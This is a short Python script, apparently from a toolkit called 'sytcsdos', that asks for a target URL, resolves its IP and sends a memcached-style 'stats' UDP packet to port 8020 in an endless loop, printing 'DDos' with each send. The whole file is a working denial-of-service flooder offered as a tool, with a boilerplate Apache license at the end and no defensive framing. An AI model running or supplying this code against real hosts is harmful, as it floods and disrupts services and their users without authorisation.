
import socket
import platform
import time
import sys
import os

REE = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[93m'
system = platform.uname()[0]

def cls():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")

cls()
os.system("python3 /usr/share/sytcsdos/src/logo.py")

target = input(f"{GREEN}Enter Target URL: ")
target = target.replace("http://", "")
target = target.replace("https://","")
target = target.replace("www.","")

ip = socket.gethostbyname(target)

port = 8020
joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker, "UTF-8"), (ip, port))
print(port, "IP site address >>", ip)

time.sleep(4)

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(bytes(joker, "UTF-8"), (ip, port))
    print(port, "DDos  >>", target, "Ip Address:", ip)






    '''
 Copyright 2024 SYTCS

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
'''
